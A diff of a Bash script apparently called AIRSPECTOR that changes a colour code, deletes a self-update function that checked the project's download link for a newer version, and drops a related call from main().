 	green_color_title="\033[0;32m"
-	red_color="\033[1;31m"
+	red_color="\033[1;91m"
 	red_color_slim="\033[0;031m"
 	blue_color="\033[1;34m"
 	cyan_color="\033[1;36m"
@@ -16152,50 +16991,7 @@ function check_default_route() {
 	return $?
 }
 
-#Update the script if your version is outdated
-function autoupdate_check() {
 
-	debug_print
-
-	echo
-	language_strings "${language}" 210 "blue"
-	echo
-
-	if check_repository_access; then
-		local version_checked=0
-		AIRSPECTOR_last_version=$(timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "AIRSPECTOR_version=" | head -n 1 | cut -d "\"" -f 2)
-
-		if [ -n "${AIRSPECTOR_last_version}" ]; then
-			version_checked=1
-		else
-			http_proxy_detect
-			if [ "${http_proxy_set}" -eq 1 ]; then
-
-				AIRSPECTOR_last_version=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} 2> /dev/null | grep "AIRSPECTOR_version=" | head -n 1 | cut -d "\"" -f 2)
-				if [ -n "${AIRSPECTOR_last_version}" ]; then
-					version_checked=1
-				else
-					language_strings "${language}" 5 "yellow"
-				fi
-			else
-				language_strings "${language}" 5 "yellow"
-			fi
-		fi
-
-		if [ "${version_checked}" -eq 1 ]; then
-			if compare_floats_greater_than "${AIRSPECTOR_last_version}" "${AIRSPECTOR_version}"; then
-				language_strings "${language}" 213 "yellow"
-				download_last_version
-			else
-				language_strings "${language}" 212 "yellow"
-			fi
-		fi
-	else
-		language_strings "${language}" 211 "yellow"
-	fi
-
-	language_strings "${language}" 115 "read"
-}
 
 #Change script language automatically if OS language is supported by the script and different from the current language
 function autodetect_language() {
@@ -16491,7 +17287,7 @@ function main() {
 		language_strings "${language}" 115 "read"
 
 		airmonzc_security_check
-		check_update_tools
+		
 	fi
 
 	print_configuration_vars_issues
